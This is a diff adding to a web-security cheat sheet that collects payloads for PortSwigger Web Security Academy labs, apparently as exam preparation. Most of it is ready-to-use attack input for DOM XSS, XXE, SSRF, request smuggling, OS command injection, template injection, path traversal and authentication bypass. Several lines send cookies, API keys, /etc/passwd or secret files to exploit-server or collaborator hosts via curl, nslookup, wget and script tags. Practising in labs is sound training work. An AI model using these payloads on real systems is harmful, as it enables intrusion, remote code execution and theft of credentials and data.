@@ -244,3 +244,452 @@ Use `DOM Invader`
 ### Exploits
 1. DOM XSS using web messages
 Notice that the home page contains an `addEventListener()` call that listens for a web message  
+```
+<iframe src="//0a8100fe032e3917c66ead67003c0020.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+```
+When the iframe loads, the postMessage() method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the div with the ID ads. However, in this case it inserts our img tag, which contains an invalid src attribute. This throws an error, which causes the onerror event handler to execute our payload.  
+2. DOM XSS using web messages and a JavaScript URL
+```
+<iframe src="https://0a2d00d604a3acfbc67064610056003c.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
+```
+3. DOM XSS using web messages and JSON.parse
+```
+<iframe src="https://0a03009c03110946c0d1aea2003700e0.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+```
+4. DOM-based open redirection
+```
+https://0ae900830459749cc2465788006000b5.web-security-academy.net/post?postId=7&url=https://exploit-0ab30006040d744dc2a7561101df00f9.exploit-server.net/exploit#
+```
+5. DOM-based cookie manipulation
+```
+<iframe src="https://0a1100e803937b60c6874ab7003b00b5.web-security-academy.net/product?productId=1&'><script>print()</script>">
+```
+## CORS and info disclosure
+For CORS check Access-Control-Allow-Credentials headers in responses  
+For injo disc use smth of this:
+```
+dirb -u <url>
+ffuf -u http://kek.com/FUZZ -w /usr/share/dirb/wordlists/big.txt -t 50 -c
+gobuster dir -u http://kek.com -w /usr/share/dirb/wordlists/common.txt
+```
+### Exploits
+1. CORS vulnerability with trusted insecure protocols
+Observe Access-Control-Allow-Credentials header in /accountDetails  
+Put Origin: stock.lab-id header  
+Go to your exploit server and create malicious payload to send admin's api key to ur server:
+```
+<script>
+location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
+2. Git disclosure
+```
+wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/
+```
+## XXE
+The main tip is to scan the whole (not targeted!) request to, usually, /product/stock check  
+### Exploits
+1. Blind XXE with out-of-band interaction via XML parameter entities
+```
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+```
+2. Exploiting blind XXE to exfiltrate data using a malicious external DTD
+Observe Submit feedback, paste xml file with the next content:
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+Check /product/stock page and paste the next XXE payload:
+```
+<!DOCTYPE stockcheck [<!ENTITY % io7ju SYSTEM "http://localhost:44901/feedback/screenshots/7.xml">%io7ju; ]>
+```
+3. Exploiting blind XXE to retrieve data via error messages
+Observe Submit feedback, paste xml file with the next content:
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+Check /product/stock page and paste the next XXE payload:
+```
+<?xml version="1.0" encoding="UTF-8" standalone='no'?><!DOCTYPE stockcheck [<!ENTITY % io7ju SYSTEM "http://localhost:41717/feedback/screenshots/1.xml">%io7ju; ]>
+```
+This will referrer to localhost with our previously created file and get content of /etc/passwd via error message.
+4. Exploiting XInclude to retrieve files
+```
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+5. Admin user import via XML
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<users>
+    <user>
+        <username>Example1</username>
+        <email>example1@domain.com&`nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com`</email>
+    </user>
+</users>
+```
+## SSRF
+If you find an SSRF vulnerability on exam, you can use it to read the files by accessing an internal-only service running on locahost on port 6566.  
+[ipconverter](https://h.43z.one/ipconverter/)  
+### SSRF Bypass:
+```
+http://2130706433 instead of http://127.0.0.1
+Hex Encoding 127.0.0.1 translates to 0x7f.0x0.0x0.0x1
+Octal Encoding 127.0.0.1 translates to 0177.0.0.01
+Mixed Encoding 127.0.0.1 translates to 0177.0.0.0x1
+http://127.1
+```
+### Internal Network addresses in CIDR
+```
+10.0.0.0/8
+127.0.0.1/32
+172.16.0.0/12
+192.168.0.1/16
+```
+### Exploits
+Like XML, the place to find SSRF is at /product/stock check and Host headers
+1. Basic SSRF against another back-end system
+```
+stockApi=http://192.168.0.34:8080/admin
+```
+2. SSRF with blacklist-based input filter
+```
+stockApi=http://127.1/AdMiN/
+```
+3. SSRF with filter bypass via open redirection vulnerability
+```
+stockApi=/product/nextProduct?currentProductId=2%26path%3dhttp://192.168.0.12:8080/admin
+```
+4. Blind SSRF with out-of-band detection
+```
+Referer: http://burpcollaborator
+```
+5. SSRF with whitelist-based input filter
+```
+stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/
+```
+## HTTP request smuggling
+Use HTTP Request Smuggler extension for BurpSuite to check (`Smuggle probe`), if there are any possible smugglings and then construct the payload  
+### Exploits
+1. Use unsupported Method GPOST (CL.TE)
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencodedPOST / HTTP/1.1
+Host: 0a6f008e04ed8481c035778000dc0063.web-security-academy.net
+Cookie: session=QjB6AgSHTuzJSZCHdc0al2SJSOtdc5bh
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 147
+tRANSFER-ENCODING: chunked
+
+3
+x=y
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+```
+2. Use unsupported Method GPOST (TE.CL)
+```
+POST / HTTP/1.1
+Host: 0a4d007b048d4832c0afb01800b700ca.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```
+3. Obfuscating TE.TE
+```
+POST / HTTP/1.1
+Host: 0a8800ee047d6d24c0c255e700a6009c.web-security-academy.net
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Transfer-Encoding: xchunked
+Content-Length: 4
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```
+4. Detecting CL.TE
+```
+POST / HTTP/1.1
+Host: 0a6f00870409bd9bc05054ca00c900d9.web-security-academy.net
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+Foo: x
+```
+5. Get other user's request to steal cookie
+```
+POST / HTTP/1.1
+Host: 0ab400c404f08302c01f503800ff00ba.web-security-academy.net
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 357
+tRANSFER-ENCODING: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Host: 0ab400c404f08302c01f503800ff00ba.web-security-academy.net
+Cookie: session=N2dqf1wUAKs2U79D8Kb9d3ROkWblLydg
+Content-Length: 814
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+csrf=nyDg9uHq32xSredK0gaIuHeyk21sESN8&postId=2&name=wad&email=rei%40gmail.com&website=https://kek.com&comment=LEL
+```
+6. Exploiting HTTP request smuggling to deliver reflected XSS
+```
+POST / HTTP/1.1
+Host: 0a5800fa04974f1bc15f0dab004400ef.web-security-academy.net
+Cookie: session=3MNdX218m6gxqn82BLl4dxpx3eCLNd8i
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 113
+tRANSFER-ENCODING: chunked
+
+3
+x=y
+0
+
+GET /post?postId=10 HTTP/1.1
+User-Agent: kek"><img src=123 onerror=alert(1)>
+Foo: x
+```
+7. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+```
+POST / HTTP/1.1
+Host: 0a6f008e04ed8481c035778000dc0063.web-security-academy.net
+Cookie: session=QjB6AgSHTuzJSZCHdc0al2SJSOtdc5bh
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 147
+tRANSFER-ENCODING: chunked
+
+3
+x=y
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
+### Bypasses
+```
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked  
+Transfer-Encoding: x  
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+
+Transfer-encoding: identity
+Transfer-encoding: cow
+```
+## OS command injection
+The place to find OS Injection is in Submit Feedback page, usually in email input, but, just in case, scan the other inputs too
+```
+email=||curl+burp.oastify.com?c=`whoami`||
+nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com
+```
+### Exploits
+1. Blind OS command injection with time delays
+```
+email=x||ping+-c+10+127.0.0.1||
+```
+2. Blind OS command injection with output redirection
+```
+email=||whoami>/var/www/images/output.txt||
+filename=output.txt
+```
+3. Blind OS command injection with out-of-band interaction
+```
+email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+```
+4. Blind OS command injection with out-of-band data exfiltration
+```
+email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+```
+5. Admin Panel ImgSize command injection
+```
+/admin-panel/admin_image?image=/blog/posts/50.jpg&ImageSize="200||nslookup+$(cat+/home/carlos/secret).<collaborator>%26"  
+Or  
+ImgSize="`/usr/bin/wget%20--post-file%20/home/carlos/secret%20https://collaborator/`"
+```
+## SSTI
+SSTI is a direct road to RCE  
+Complexity can only arise when searching for the language in which the code was written  
+We iterate over template expressions `({{7*7}}, ${7*7},<% = 7*7 %>, ${{7*7}}, #{7*7}, *{7*7})`  
+If one of this works, go to [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) and look for all technologies that use this expression  
+In case `{{7*7}}` only God can tell you what kind of technology it is.  
+Also scan with Burp Scanner  
+Arises at View Details with reflected phrase `Unfortunately this product is out of stock`  
+### Exploits
+1. Basic server-side template injection
+Ruby
+```
+<%= system("rm+morale.txt") %>
+```
+2. Basic server-side template injection (code context)
+```
+blog-post-author-display=user.first_name}}{%+import+os+%}{{os.system('rm+morale.txt')}}
+```
+3. SSTI using documentation
+Java Freemaker
+```
+${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
+```
+4. SSTI in an unknown language with a documented exploit
+NodeJS Handlebars [exploit](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs)
+5. SSTI with information disclosure via user-supplied objects
+Python Jinja2
+```
+{{settings.SECRET_KEY}}
+```
+6. Admin panel Password Reset Email SSTI
+Jinja2
+```
+newEmail={{username}}!{{+self.init.globals.builtins.import('os').popen('cat+/home/carlos/secret').read()+}}
+&csrf=csrf
+```
+## Directory traversal
+Just scan with Burp  
+If you can get /etc/passwd, but cannot get /home/carlos/secret (maybe WAF is blocking the word secret), just URL-Encode the whole payload (even with /home/carlos/secret) like this:
+```
+/image?filename=%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%38%25%36%66%25%36%64%25%36%35%25%32%66%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33%25%32%66%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34
+```
+Arises at `/image?filename=`
+recommend you to turn on images inspection in proxy setting to easily detect this type  
+### Exploits
+1. File path traversal, traversal sequences blocked with absolute path bypass
+```
+/image?filename=/etc/passwd
+```
+2. File path traversal, traversal sequences stripped non-recursively
+```
+/image?filename=..././..././..././etc/passwd
+```
+3. File path traversal, traversal sequences stripped with superfluous URL-decode
+```
+Double URL-encode ../../../etc/passwd
+(e.g. %252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd)
+It is recommended to use cyberchef to encode
+```
+4. File path traversal, validation of start of path
+```
+/image?filename=/var/www/images/../../../../etc/passwd
+```
+5. File path traversal, validation of file extension with null byte bypass
+```
+../../../../../../etc/passwd%00.jpg
+```
+## Access control vulnerabilities
+Look for potential IDORs and some additional response fields from servers
+### Exploits
+1. User role can be modified in user profile
+When changing e-mail, check for roleid in response  
+Add it to your request and change it to 2  
+Also if it doesn't work, brute numbers from 0 to 100  
+2. URL-based access control can be circumvented
+```
+X-Original-Url: /admin
+```
+## Authentication
+Use Burp's usernames and paswords dictionaries  
+## Exploits
+1. Simple 2FA Bypass
+```
+Just try to access the next endpoint directly (you need to know the path of the next endpoint) e.g. /my-account
+If this doesn’t work, try to change the Referrer header as if you came from the 2FA page 
+```
+2. Password reset broken logic
+Change username in POST request after password-reset link
+```
+temp-forgot-password-token=MgFMne17hOm2WM5BMHyVzvEewBFOwnyc&username=carlos&new-password-1=w&new-password-2=w
+```
+3. User Enumeration with Different Responses
+Just look at difference in responses
+4. User Enumeration with Different Response Time
+Just look at difference in response time  
+Also for this lab you need to set X-Forwarded-For header to bypass login restrictions
+5. Broken brute-force protection, IP block
+You can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached. For example create a combined list with your valid credentials and with victim's creds:
+```
+wiener - peter
+carlos - kek
+carlos - kek2
+wiener - peter
+carlos - kek3 etc...
+```
+6. Username enumeration via account lock
+It blocks only existing accounts, so try to brute the same list of passwords until one of accounts from the list is not blocked.  
+To brute password use grep with errors to find a request without error
+7. 2FA broken logic
+Observe there is verify=wiener in cookie while sending 2FA code  
+Change it to our victim's nickname and simply brute 2FA code
+8. Brute-forcing a stay-logged-in cookie
+Observe stay logged in function. Check cookie and observe that it is base64 encoded version of USERNAME:(md5)PASSWORD  
+Create a list of md5 hashed passwords and brute cookies
+9. Offline password cracking
+Steal cookie in comment section via XSS: 
+```
+<script>document.write('<img src="https://exploit-server?c='+document.cookie+'" />');</script>
+```
+Crack MD5 hash via john the ripper or web services
+10. Password reset poisoning via middleware
+While processing forgot password set new header:
+```
+X-Forwarded-Host: exploit-server 
+```
+It will process Host Header Injection
+11. Password brute-force via password change
+While processing password changing, observe that you can change nickname.
+Change it to victim's one and brute his password
